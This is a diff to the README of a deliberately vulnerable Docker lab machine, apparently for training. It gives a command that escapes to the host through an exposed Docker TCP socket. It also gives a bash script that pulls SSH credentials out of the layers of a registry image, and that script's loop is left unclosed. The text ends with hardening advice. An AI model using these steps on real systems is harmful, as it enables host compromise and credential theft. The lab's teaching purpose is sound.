@@ -18,17 +18,40 @@ To use it, the `ssh.sh` script, as well as the `docker-security-flaws.sh` script
 
 - provides us a shell inside the container 
 
+## Two ways to exploit the vm
 
-### Escaping docker container via exposed socket
+### 1) Exploit VM via via exposed socket (RCE)
 
-- exposed socket in `/var/run`
-- `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
+- exposed socket in `/var/run` 
+- possible to execute docker commands remotely
+- `docker -H tcp://localhost:4444 run -v /:/mnt --rm -it alpine chroot /mnt sh`
+- mountings the hosts `/` directory to the `/mnt` directory in a new container, `chrooting` and then connecting via `shell`
 
+### 2) 
 
+Since it is possible to load images from the registry, we can further investiagte those. The workstation image contains ssh credentials for the vm. 
 
+```
+#!/bin/bash
 
+docker -H tcp://localhost:4444 save 127.0.0.1:5000/workstation:latest > image.tar
 
+mkdir image-data
+tar -xf image.tar -C image-data/
 
+cd image-data/
+for i in ./*/; do
+    cd $i
+    tar -xf layer.tar
+    if [ -e root/ws.env ]; then
+        cat root/ws.env
+        exit 0
+    fi
+    cd ..
+
+```
+
+It is also possible to use tools like [dive](https://github.com/wagoodman/dive) to take a closer look at layers.
 
 
 
@@ -64,5 +87,10 @@ Developers love to automate, and this is proven nonetheless with Docker. Whilst 
 
 
 To achieve this, the daemon must use a TCP socket instead, permitting data for the Docker daemon to be communicated using the network interface and ultimately exposing it to the network for us to exploit.
+It would be advisable to use some form of authentication (e.g., a proxy) to prevent misuse as shown in this vulnerable machine. Even better: Do not expose a socket at all.
 
-It would be advisable to use some form of authentication (e.g., a proxy) to prevent misuse, as shown in this vulnerable machine.
+### Docker images / layers
+
+Do not use docker images from untrusted sources. If you use docker images, try to understand the image creation process. Do not store or load credentials in docker images.
+
+
